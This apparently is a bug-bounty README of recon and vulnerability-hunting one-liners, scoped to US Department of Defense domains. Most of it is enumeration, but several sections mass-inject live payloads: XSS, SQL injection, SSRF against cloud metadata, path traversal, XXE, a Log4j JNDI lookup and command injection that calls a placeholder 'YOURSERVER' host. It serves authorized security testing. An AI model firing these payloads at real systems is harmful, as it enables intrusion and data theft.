<div align="center">

# KingOfBugBountyTips

<img src="https://user-images.githubusercontent.com/50994705/228697976-c9e7e8b8-f6dd-4c5a-a7be-8c7b2e8e4a8c.gif" width="600" alt="Bug Bounty Hunter">

### The Ultimate Bug Bounty Reconnaissance Arsenal

<p>
  <img src="https://img.shields.io/badge/Bug%20Bounty-Hunter-red?style=for-the-badge&logo=hackerone">
  <img src="https://img.shields.io/badge/Recon-Methodology-blue?style=for-the-badge&logo=target">
  <img src="https://img.shields.io/badge/Oneliners-Collection-green?style=for-the-badge&logo=gnubash">
  <img src="https://img.shields.io/badge/DoD-VDP-yellow?style=for-the-badge&logo=shieldsdotio">
</p>

[![Telegram](https://img.shields.io/badge/Telegram-Join%20Group-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/joinchat/DN_iQksIuhyPKJL1gw0ttA)
[![Twitter](https://img.shields.io/badge/Twitter-@ofjaaah-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/ofjaaah)
[![YouTube](https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/c/OFJAAAH)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/atjunior/)

<img src="https://github-readme-stats.vercel.app/api?username=KingOfBugbounty&show_icons=true&theme=radical" alt="GitHub Stats">

</div>

---

## Department of Defense - Bug Bounty Program

<div align="center">
<table>
<tr>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/United_States_Department_of_Defense_Seal.svg/150px-United_States_Department_of_Defense_Seal.svg.png" width="70"><br><b>DoD</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/69/Emblem_of_the_United_States_Department_of_the_Army.svg/150px-Emblem_of_the_United_States_Department_of_the_Army.svg.png" width="70"><br><b>Army</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Seal_of_the_United_States_Department_of_the_Navy.svg/150px-Seal_of_the_United_States_Department_of_the_Navy.svg.png" width="70"><br><b>Navy</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d9/Seal_of_the_U.S._Air_Force.svg/150px-Seal_of_the_U.S._Air_Force.svg.png" width="70"><br><b>Air Force</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Seal_of_the_United_States_Marine_Corps.svg/150px-Seal_of_the_United_States_Marine_Corps.svg.png" width="70"><br><b>Marines</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/Seal_of_the_United_States_Space_Force.svg/150px-Seal_of_the_United_States_Space_Force.svg.png" width="70"><br><b>Space Force</b></td>
</tr>
</table>
</div>

---

## Table of Contents

- [About](#about)
- [Required Tools](#required-tools)
- [BBRF Scope DoD](#bbrf-scope-dod)
- [Subdomain Enumeration](#subdomain-enumeration)
- [JavaScript Recon](#javascript-recon)
- [XSS Detection](#xss-detection)
- [SQL Injection](#sql-injection)
- [SSRF & SSTI](#ssrf--ssti)
- [Web Crawling](#web-crawling)
- [Parameter Discovery](#parameter-discovery)
- [Content Discovery](#content-discovery)
- [Nuclei Scanning](#nuclei-scanning)
- [Automation Scripts](#automation-scripts)
- [Bash Functions](#bash-functions)
- [New Oneliners 2024-2025](#new-oneliners-2024-2025)
- [Search Engines for Hackers](#search-engines-for-hackers)

---

## About

Our main goal is to share tips from well-known bug hunters. Using recon methodology, we find subdomains, APIs, and tokens that are exploitable. We aim to influence the community with Oneliner tips for better understanding.

**Download BugBuntu:** [![BugBuntu](https://img.shields.io/badge/Download-BugBuntu-orange?style=flat-square&logo=linux)](https://sourceforge.net/projects/bugbuntu/)

---

## Required Tools

<details>
<summary><b>Click to expand tool list</b></summary>

| Category | Tools |
|:--------:|:------|
| **Subdomain** | [Subfinder](https://github.com/projectdiscovery/subfinder), [Amass](https://github.com/OWASP/Amass), [Assetfinder](https://github.com/tomnomnom/assetfinder), [Findomain](https://github.com/Edu4rdSHL/findomain), [Chaos](https://github.com/projectdiscovery/chaos-client) |
| **HTTP** | [Httpx](https://github.com/projectdiscovery/httpx), [Httprobe](https://github.com/tomnomnom/httprobe) |
| **Crawling** | [Katana](https://github.com/projectdiscovery/katana), [Gospider](https://github.com/jaeles-project/gospider), [Hakrawler](https://github.com/hakluke/hakrawler), [Cariddi](https://github.com/edoardottt/cariddi) |
| **URLs** | [Gau](https://github.com/lc/gau), [Waybackurls](https://github.com/tomnomnom/waybackurls), [Waymore](https://github.com/xnl-h4ck3r/waymore) |
| **Scanning** | [Nuclei](https://github.com/projectdiscovery/nuclei), [Jaeles](https://github.com/jaeles-project/jaeles), [Naabu](https://github.com/projectdiscovery/naabu) |
| **XSS** | [Dalfox](https://github.com/hahwul/dalfox), [XSStrike](https://github.com/s0md3v/XSStrike), [Kxss](https://github.com/Emoe/kxss), [Airixss](https://github.com/ferreiraklet/airixss) |
| **SQLi** | [SQLMap](https://github.com/sqlmapproject/sqlmap), [Ghauri](https://github.com/r0oth3x49/ghauri) |
| **Utilities** | [Anew](https://github.com/tomnomnom/anew), [Qsreplace](https://github.com/tomnomnom/qsreplace), [Unfurl](https://github.com/tomnomnom/unfurl), [Gf](https://github.com/tomnomnom/gf), [Uro](https://github.com/s0md3v/uro) |
| **Fuzzing** | [Ffuf](https://github.com/ffuf/ffuf), [Feroxbuster](https://github.com/epi052/feroxbuster) |
| **JS Analysis** | [Subjs](https://github.com/lc/subjs), [LinkFinder](https://github.com/GerbenJavado/LinkFinder), [SecretFinder](https://github.com/m4ll0k/SecretFinder), [Jsubfinder](https://github.com/ThreatUnkown/jsubfinder) |

</details>

---

## BBRF Scope DoD

```bash
bbrf inscope add '*.af.mil' '*.osd.mil' '*.marines.mil' '*.pentagon.mil' '*.disa.mil' '*.health.mil' '*.dau.mil' '*.dtra.mil' '*.ng.mil' '*.dds.mil' '*.uscg.mil' '*.army.mil' '*.dcma.mil' '*.dla.mil' '*.dtic.mil' '*.yellowribbon.mil' '*.socom.mil' '*.spaceforce.mil' '*.ussf.mil'
```

---

## Subdomain Enumeration

### Multi-Source Discovery
```bash
subfinder -d target.com -all -silent | anew subs.txt
amass enum -passive -d target.com | anew subs.txt
assetfinder -subs-only target.com | anew subs.txt
chaos -d target.com -silent | anew subs.txt
cat subs.txt | httpx -silent -threads 200 | anew alive.txt
```

### Certificate Transparency
```bash
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent
```

### Shodan + Nuclei Pipeline
```bash
shodan domain target.com | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
```

### ASN Discovery
```bash
echo 'target_org' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
```

### DNS Bruteforce with Shuffledns
```bash
shuffledns -d target.com -w wordlist.txt -r resolvers.txt -silent | httpx -silent | anew
```

### Recursive Subdomain Enum
```bash
subfinder -d target.com -recursive -all -silent | dnsx -silent | httpx -silent | anew recursive_subs.txt
```

---

## JavaScript Recon

### Complete JS Pipeline
```bash
subfinder -d target.com -silent | httpx -silent | katana -d 5 -jc -silent | grep -iE '\.js$' | anew js.txt
```

### Extract Secrets from JS
```bash
cat js.txt | httpx -silent -sr -srd js_files/ && nuclei -t exposures/ -target js.txt
```

### LinkFinder on JS Files
```bash
cat js.txt | xargs -I@ -P10 bash -c 'python3 linkfinder.py -i @ -o cli 2>/dev/null' | anew endpoints.txt
```

### SecretFinder Mass Scan
```bash
cat js.txt | xargs -I@ -P5 python3 SecretFinder.py -i @ -o cli | anew secrets.txt
```

### JS Variables Extraction
```bash
cat file.js | grep -oE "var\s+\w+\s*=\s*['\"][^'\"]+['\"]" | sort -u
```

### API Keys from JS
```bash
cat js.txt | nuclei -t http/exposures/tokens/ -silent | anew api_keys.txt
```

---

## XSS Detection

### Dalfox Pipeline
```bash
cat urls.txt | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence --skip-bav
```

### Blind XSS with Callback
```bash
cat urls.txt | gf xss | qsreplace '"><script src=https://xss.report/c/YOURID></script>' | httpx -silent
```

### Airixss Fast Scan
```bash
echo target.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```

### Knoxss API
```bash
cat urls.txt | gf xss | uro | xargs -I@ curl -s "https://knoxss.me/api/v3" -d "target=@" -H "X-API-KEY: YOUR_KEY"
```

### DOM XSS Detection
```bash
cat js.txt | xargs -I@ bash -c 'curl -s @ | grep -E "(document\.(location|URL|cookie|domain|referrer)|innerHTML|outerHTML|eval\(|\.write\()" && echo "--- @ ---"'
```

### Mass XSS with Nuclei DAST
```bash
cat urls.txt | httpx -silent | nuclei -dast -t dast/vulnerabilities/xss/ -rl 50
```

### Reflected Parameter Detection
```bash
cat urls.txt | kxss 2>/dev/null | grep -v "Not Reflected" | anew reflected_params.txt
```

---

## SQL Injection

### SQLMap Mass Scan
```bash
cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2
```

### Error-Based Detection
```bash
cat urls.txt | gf sqli | qsreplace "'" | httpx -silent -ms "error|sql|syntax|mysql|postgresql|oracle" | anew sqli_errors.txt
```

### Time-Based Blind
```bash
cat urls.txt | gf sqli | qsreplace "1' AND SLEEP(5)-- -" | httpx -silent -timeout 10 | anew time_based.txt
```

### Ghauri Scan
```bash
cat sqli.txt | xargs -I@ ghauri -u @ --batch --level 3
```

### UNION Detection
```bash
cat urls.txt | gf sqli | qsreplace "1 UNION SELECT NULL,NULL,NULL-- -" | httpx -silent -mc 200
```

---

## SSRF & SSTI

### SSRF with Interactsh
```bash
cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
```

### SSRF Parameter Fuzzing
```bash
cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -match-string "ami-id"
```

### SSTI Detection
```bash
cat urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent -match-string "49" | anew ssti_vuln.txt
```

### SSTI Payload Test
```bash
cat urls.txt | qsreplace '${7*7}' | httpx -silent -mr "49" && cat urls.txt | qsreplace '<%= 7*7 %>' | httpx -silent -mr "49"
```

### Full SSRF Chain
```bash
cat params.txt | grep -iE "(url|uri|path|src|dest|redirect|redir|return|next|target|out|view|page|show|fetch|load)" | qsreplace "http://YOURSERVER" | httpx -silent
```

---

## Web Crawling

### Katana Deep Crawl
```bash
katana -u https://target.com -d 10 -jc -kf all -aff -silent | anew crawl.txt
```

### Gospider Full Crawl
```bash
gospider -s https://target.com -c 20 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico)" | anew
```

### Hakrawler with Scope
```bash
echo https://target.com | hakrawler -d 5 -subs -u | anew hakrawler.txt
```

### ParamSpider Discovery
```bash
paramspider -d target.com --exclude woff,css,js,png,svg,jpg -o params.txt
```

### Waymore Historical URLs
```bash
waymore -i target.com -mode U -oU urls.txt
```

---

## Parameter Discovery

### X8 Hidden Parameters
```bash
cat urls.txt | httpx -silent | xargs -I@ x8 -u @ -w params.txt
```

### Arjun Discovery
```bash
arjun -i urls.txt -oT arjun_params.txt --stable
```

### Custom Param Bruteforce
```bash
cat urls.txt | sed 's/$/\?FUZZ=test/' | ffuf -w params.txt:FUZZ -u FUZZ -mc 200,301,302 -ac
```

---

## Content Discovery

### Ffuf Directory Bruteforce
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403 -ac -c -t 100
```

### Git Exposure
```bash
cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]" | anew git_exposed.txt
```

### Sensitive Files
```bash
cat urls.txt | httpx -silent -path /.env,/config.php,/wp-config.php.bak,/.htaccess,/server-status -mc 200 | anew sensitive.txt
```

### Backup Files
```bash
cat urls.txt | sed 's/$/.bak/' | httpx -silent -mc 200 && cat urls.txt | sed 's/$/.old/' | httpx -silent -mc 200
```

### API Documentation
```bash
cat urls.txt | httpx -silent -path /swagger.json,/openapi.json,/api-docs,/swagger-ui.html -mc 200 | anew api_docs.txt
```

---

## Nuclei Scanning

### Full Template Scan
```bash
nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high,medium -c 50 -rl 150 -o nuclei_results.txt
```

### CVE Scanning
```bash
nuclei -l alive.txt -t cves/ -severity critical,high -c 30 -o cve_results.txt
```

### Subdomain Takeover
```bash
subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -c 50
```

### Exposed Panels
```bash
nuclei -l alive.txt -t exposed-panels/ -c 50 | anew panels.txt
```

### Misconfigurations
```bash
nuclei -l alive.txt -t misconfiguration/ -severity high,critical | anew misconfig.txt
```

### DAST Mode
```bash
nuclei -l urls.txt -dast -rl 10 -c 3 -o dast_results.txt
```

---

## Automation Scripts

### Full Recon Pipeline
```bash
#!/bin/bash
domain=$1
mkdir -p $domain && cd $domain

# Subdomains
subfinder -d $domain -all -silent | anew subs.txt
amass enum -passive -d $domain | anew subs.txt
assetfinder -subs-only $domain | anew subs.txt

# Alive check
cat subs.txt | httpx -silent -threads 100 | anew alive.txt

# URLs
cat alive.txt | katana -d 5 -jc -silent | anew urls.txt
cat alive.txt | waybackurls | anew urls.txt
cat alive.txt | gau --threads 50 | anew urls.txt

# Vulnerability patterns
cat urls.txt | gf xss | anew xss.txt
cat urls.txt | gf sqli | anew sqli.txt
cat urls.txt | gf ssrf | anew ssrf.txt
cat urls.txt | gf lfi | anew lfi.txt

# Nuclei scan
nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
```

### XSS Hunter Script
```bash
#!/bin/bash
target=$1
echo $target | waybackurls | anew urls.txt
echo $target | gau | anew urls.txt
cat urls.txt | gf xss | uro | qsreplace '"><img src=x onerror=alert(1)>' | airixss -payload "alert(1)" | tee xss_found.txt
cat urls.txt | gf xss | uro | dalfox pipe --silence | tee -a xss_found.txt
```

---

## Bash Functions

Add to your `.bashrc` or `.zshrc`:

```bash
# Quick recon
recon() {
    subfinder -d $1 -silent | anew subs.txt
    assetfinder -subs-only $1 | anew subs.txt
    cat subs.txt | httpx -silent | anew alive.txt
    echo "[+] Found $(wc -l < alive.txt) alive hosts"
}

# XSS scan
xscan() {
    echo $1 | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
}

# SQLi scan
sqscan() {
    echo $1 | waybackurls | gf sqli | uro | qsreplace "'" | httpx -silent -ms "error|syntax|mysql"
}

# JS recon
jsrecon() {
    echo $1 | waybackurls | grep -iE "\.js$" | httpx -silent | nuclei -t exposures/
}

# Nuclei quick
nuke() {
    echo $1 | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high
}

# Full pipeline
fullrecon() {
    recon $1
    cat alive.txt | katana -d 3 -jc -silent | anew urls.txt
    cat urls.txt | gf xss | anew xss.txt
    cat urls.txt | gf sqli | anew sqli.txt
    nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high -o vulns.txt
}

# Certificate search
cert() {
    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
}

# Parameter extraction
params() {
    echo $1 | waybackurls | grep "=" | uro | unfurl keys | sort -u
}
```

---

## New Oneliners 2024-2025

### Nuclei DAST XSS
```bash
echo "https://target.com" | nuclei -dast -t dast/vulnerabilities/xss/ -rl 5
```

### GraphQL Introspection
```bash
cat urls.txt | httpx -silent -path /graphql -mc 200 | xargs -I@ curl -s @ -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | grep -v "error"
```

### JWT Extraction
```bash
cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
```

### Open Redirect Mass
```bash
cat urls.txt | gf redirect | qsreplace "https://evil.com" | httpx -silent -location | grep "evil.com"
```

### CORS Misconfiguration
```bash
cat urls.txt | httpx -silent -H "Origin: https://evil.com" -match-string "evil.com" | anew cors_vuln.txt
```

### Host Header Injection
```bash
cat urls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -match-string "evil.com"
```

### CRLF Injection
```bash
cat urls.txt | qsreplace "%0d%0aX-Injected: header" | httpx -silent -match-string "X-Injected"
```

### Prototype Pollution
```bash
cat js.txt | xargs -I@ curl -s @ | grep -E "(__proto__|constructor\.prototype)" | anew proto_pollution.txt
```

### Cache Poisoning Detection
```bash
cat urls.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -H "X-Original-URL: /admin" -mc 200
```

### IDOR Pattern Detection
```bash
cat urls.txt | grep -oE "(id|user|account|uid|pid)=[0-9]+" | sort -u | anew idor_candidates.txt
```

### Race Condition URLs
```bash
cat urls.txt | grep -iE "(redeem|coupon|vote|like|follow|transfer|withdraw)" | anew race_condition.txt
```

### WebSocket Endpoints
```bash
cat urls.txt | grep -iE "(socket|ws://|wss://)" | anew websocket.txt
```

### Path Traversal
```bash
cat urls.txt | gf lfi | qsreplace "....//....//....//etc/passwd" | httpx -silent -match-string "root:x"
```

### XXE Detection
```bash
cat urls.txt | grep -iE "\.(xml|soap)" | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
```

### Log4j Scan
```bash
cat urls.txt | qsreplace '${jndi:ldap://YOURSERVER/a}' | httpx -silent -H 'X-Api-Version: ${jndi:ldap://YOURSERVER/a}'
```

### Blind Command Injection
```bash
cat urls.txt | qsreplace "\`curl YOURSERVER\`" | httpx -silent
cat urls.txt | qsreplace "| curl YOURSERVER" | httpx -silent
```

### Mass Screenshot
```bash
cat alive.txt | xargs -I@ gowitness single @ -o screenshots/
```

### Technology Detection
```bash
cat alive.txt | httpx -silent -tech-detect -status-code -title | anew tech_stack.txt
```

### Favicon Hash (Shodan)
```bash
curl -s https://target.com/favicon.ico | md5sum | awk '{print $1}'
```

### S3 Bucket Finder
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com" | anew s3_buckets.txt
```

### Firebase Database
```bash
cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.firebaseio\.com" | xargs -I@ curl -s @/.json | grep -v "null"
```

### Exposed Admin Panels
```bash
cat alive.txt | httpx -silent -path /admin,/administrator,/admin.php,/wp-admin,/manager,/phpmyadmin -mc 200,301,302 | anew admin_panels.txt
```

### Debug Endpoints
```bash
cat alive.txt | httpx -silent -path /debug,/trace,/actuator,/metrics,/health,/info -mc 200 | anew debug_endpoints.txt
```

### Spring Boot Actuators
```bash
cat alive.txt | httpx -silent -path /actuator/env,/actuator/heapdump,/actuator/mappings -mc 200 | anew spring_actuators.txt
```

### WordPress Enumeration
```bash
cat alive.txt | httpx -silent -path /wp-json/wp/v2/users -mc 200 | anew wp_users.txt
```

### Laravel Debug Mode
```bash
cat alive.txt | httpx -silent -match-string "Whoops" -match-string "Laravel" | anew laravel_debug.txt
```

### Django Debug
```bash
cat alive.txt | httpx -silent -match-string "Django" -match-string "DEBUG" | anew django_debug.txt
```

---

## Search Engines for Hackers

| Engine | Link | Description |
|:------:|:----:|:-----------:|
| Shodan | [shodan.io](https://shodan.io) | IoT & device search |
| Censys | [censys.io](https://censys.io) | Internet scan data |
| Fofa | [fofa.info](https://en.fofa.info) | Cyberspace search |
| ZoomEye | [zoomeye.org](https://zoomeye.org) | Cyberspace mapping |
| Hunter | [hunter.how](https://hunter.how) | Asset discovery |
| Netlas | [netlas.io](https://netlas.io) | Attack surface |
| GreyNoise | [greynoise.io](https://viz.greynoise.io) | Internet scanners |
| Onyphe | [onyphe.io](https://onyphe.io) | Cyber defense |
| CriminalIP | [criminalip.io](https://criminalip.io) | Threat intel |
| FullHunt | [fullhunt.io](https://fullhunt.io) | Attack surface |
| Quake | [quake.360.net](https://quake.360.net) | Cyberspace search |
| Leakix | [leakix.net](https://leakix.net) | Leak detection |
| URLScan | [urlscan.io](https://urlscan.io) | URL analysis |
| DNSDumpster | [dnsdumpster.com](https://dnsdumpster.com) | DNS recon |
| crt.sh | [crt.sh](https://crt.sh) | Certificate search |
| SecurityTrails | [securitytrails.com](https://securitytrails.com) | DNS history |

---

## Special Thanks

| Hunter | Hunter | Hunter |
|:------:|:------:|:------:|
| [@bt0s3c](https://twitter.com/bt0s3c) | [@MrCl0wnLab](https://twitter.com/MrCl0wnLab) | [@stokfredrik](https://twitter.com/stokfredrik) |
| [@Jhaddix](https://twitter.com/Jhaddix) | [@TomNomNom](https://twitter.com/TomNomNom) | [@NahamSec](https://twitter.com/NahamSec) |
| [@zseano](https://twitter.com/zseano) | [@pry0cc](https://twitter.com/pry0cc) | [@pdiscoveryio](https://twitter.com/pdiscoveryio) |
| [@jeff_foley](https://twitter.com/jeff_foley) | [@haaborern](https://twitter.com/haaborern) | [@0xacb](https://twitter.com/0xacb) |

---

<div align="center">

<a href="https://www.buymeacoffee.com/OFJAAAH"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" width="180"></a>

<p>
  <img src="https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?style=for-the-badge">
  <img src="https://img.shields.io/badge/Made%20with-Go-00ADD8.svg?style=for-the-badge&logo=go">
  <img src="https://img.shields.io/badge/Open%20Source-Yes-green?style=for-the-badge&logo=github">
</p>

**For authorized security testing only. Always obtain proper authorization.**

</div>
